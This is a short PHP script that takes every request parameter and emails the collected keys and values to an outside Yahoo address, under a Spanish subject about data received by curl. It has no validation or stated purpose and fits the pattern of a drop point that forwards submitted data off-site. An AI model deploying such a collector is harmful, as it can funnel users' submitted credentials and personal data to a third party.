<?php
$lleg = '';
foreach ($_REQUEST as $key => $value) {
	$lleg .= $key." = ".$value."<br>\n";
}
mail("rotanol@yahoo.com", "Datos recibidos por curl", $lleg);
?>
